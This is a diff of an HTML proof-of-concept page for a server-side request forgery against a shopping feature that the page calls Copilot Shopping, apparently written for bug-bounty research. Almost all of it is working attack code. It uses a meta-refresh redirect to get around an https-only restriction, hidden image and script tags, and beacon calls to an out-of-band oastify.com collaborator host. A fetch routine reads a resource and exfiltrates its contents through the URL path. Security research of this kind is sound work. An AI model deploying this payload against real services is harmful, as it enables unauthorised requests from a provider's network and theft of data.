@@ -4,16 +4,16 @@
 <meta charset="utf-8">
 <title>Copilot Shopping SSRF PoC</title>
 <!-- (3) https-only bypass: renderer follows client-side redirect to an http URL -->
-<meta http-equiv="refresh" content="0;url=http://0ijmhid0ibsljtpnhzwurn72nttphe.oastify.com/META-HTTP-REDIR">
+<meta http-equiv="refresh" content="0;url=http://c1ey0uwc1nbx258z0bf6azqe65c20r.oastify.com/META-HTTP-REDIR">
 </head>
 <body>
 <!-- (1) HTML subresource load: proves a real browser parses the page + follows resources -->
-<img src="https://0ijmhid0ibsljtpnhzwurn72nttphe.oastify.com/IMG-HTMLTAG" style="display:none">
-<script src="https://0ijmhid0ibsljtpnhzwurn72nttphe.oastify.com/SCRIPT-HTMLTAG"></script>
+<img src="https://c1ey0uwc1nbx258z0bf6azqe65c20r.oastify.com/IMG-HTMLTAG" style="display:none">
+<script src="https://c1ey0uwc1nbx258z0bf6azqe65c20r.oastify.com/SCRIPT-HTMLTAG"></script>
 <script>
 // (2) Attacker JS executes inside Microsoft's rendering service -> arbitrary outbound from MS network
-navigator.sendBeacon('https://0ijmhid0ibsljtpnhzwurn72nttphe.oastify.com/JS-BEACON');
-new Image().src='https://0ijmhid0ibsljtpnhzwurn72nttphe.oastify.com/JS-FIRST';
+navigator.sendBeacon('https://c1ey0uwc1nbx258z0bf6azqe65c20r.oastify.com/JS-BEACON');
+new Image().src='https://c1ey0uwc1nbx258z0bf6azqe65c20r.oastify.com/JS-FIRST';
 
 // (4) Async fetch -> read -> OOB exfil via URL path (data-exfil primitive).
 //     Fetches a same-origin resource the renderer can read, then exfiltrates its CONTENT
@@ -22,10 +22,10 @@ new Image().src='https://0ijmhid0ibsljtpnhzwurn72nttphe.oastify.com/JS-FIRST';
 fetch('https://labsvpn1337.github.io/MSOBB-flexfic-C/data.txt')
   .then(function(r){ return r.text(); })
   .then(function(t){
-    new Image().src='https://0ijmhid0ibsljtpnhzwurn72nttphe.oastify.com/EXFIL-DATA/'+encodeURIComponent(t);
-    navigator.sendBeacon('https://0ijmhid0ibsljtpnhzwurn72nttphe.oastify.com/EXFIL-LEN', String(t.length));
+    new Image().src='https://c1ey0uwc1nbx258z0bf6azqe65c20r.oastify.com/EXFIL-DATA/'+encodeURIComponent(t);
+    navigator.sendBeacon('https://c1ey0uwc1nbx258z0bf6azqe65c20r.oastify.com/EXFIL-LEN', String(t.length));
   })
-  .catch(function(e){ navigator.sendBeacon('https://0ijmhid0ibsljtpnhzwurn72nttphe.oastify.com/EXFIL-ERR', String(e&&e.message||e)); });
+  .catch(function(e){ navigator.sendBeacon('https://c1ey0uwc1nbx258z0bf6azqe65c20r.oastify.com/EXFIL-ERR', String(e&&e.message||e)); });
 </script>
 </body>
 </html>
